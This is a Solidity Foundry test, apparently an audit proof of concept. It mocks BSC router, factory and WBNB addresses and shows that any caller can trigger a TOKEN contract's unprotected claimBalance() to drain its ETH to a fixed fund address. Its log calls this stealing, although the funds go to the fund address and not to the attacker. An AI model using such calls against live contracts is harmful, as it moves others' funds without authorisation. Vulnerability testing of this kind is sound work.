// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/TOKEN.sol";
import {console} from "forge-std/console.sol";

contract MockWBNB {
    function approve(address, uint256) public pure returns (bool) {
        return true;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xC0FFEE);
    }
}

contract MockSwapRouter {
    function factory() external pure returns (address) {
        return address(0xCAFE); // Factory address
    }
}

contract TokenClaimBalanceTest is Test {
    TOKEN token;
    address public constant FUND_ADDRESS = address(0xBE3f4B5f6889c64D817E73d0eA66EA58901FFe3C);
    address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Mock WBNB address
        MockWBNB mockWbnb = new MockWBNB();
        vm.etch(WBNB_ADDRESS, address(mockWbnb).code);

        // Mock Factory address
        MockFactory mockFactory = new MockFactory();
        vm.etch(address(0xCAFE), address(mockFactory).code);

        // Mock Router address
        MockSwapRouter mockRouter = new MockSwapRouter();
        vm.etch(ROUTER_ADDRESS, address(mockRouter).code);

        // Deploy token using no-argument constructor
        token = new TOKEN();
    }

    function testAnyoneCanClaimBalance() public {
        uint256 amount = 1 ether;
        deal(address(token), amount); // Fund token contract
        
        address attacker = makeAddr("attacker");
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 tokenContractBalanceBefore = address(token).balance;
        uint256 fundAddressBalanceBefore = FUND_ADDRESS.balance;
        console.log("Token contract ETH balance: %d", tokenContractBalanceBefore);
        console.log("Fund address ETH balance: %d", fundAddressBalanceBefore);
        console.log("--- Trigger (attack) ---");
        console.log("Attacker is calling claimBalance()");

        // Attacker calls unprotected function
        vm.prank(attacker);
        token.claimBalance(); // Vulnerable call
        
        console.log("--- AFTER-Trigger Balances ---");
        uint256 tokenContractBalanceAfter = address(token).balance;
        uint256 fundAddressBalanceAfter = FUND_ADDRESS.balance;
        console.log("Token contract ETH balance: %d", tokenContractBalanceAfter);
        console.log("Fund address ETH balance: %d", fundAddressBalanceAfter);
        
        console.log("--- DIFFERENTIAL VERIFICATION ---");
        bool contractBalanceChanged = tokenContractBalanceAfter < tokenContractBalanceBefore;
        bool fundAddressBalanceChanged = fundAddressBalanceAfter > fundAddressBalanceBefore;
        bool vulnerabilityExists = contractBalanceChanged && fundAddressBalanceChanged;
        
        console.log("Token balance decreased: %s", contractBalanceChanged ? "YES" : "NO");
        console.log("Fund address balance increased: %s", fundAddressBalanceChanged ? "YES" : "NO");
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Anyone can call claimBalance and steal ETH");
        } else {
            console.log("Vulnerability not Exist: Failed to manipulate ETH balances");
        }
        
        // Original assertions remain for test failure conditions
        assertEq(address(token).balance, 0, "Contract balance not drained");
        assertEq(FUND_ADDRESS.balance, fundAddressBalanceBefore + amount, "Funds not transferred");
    }
}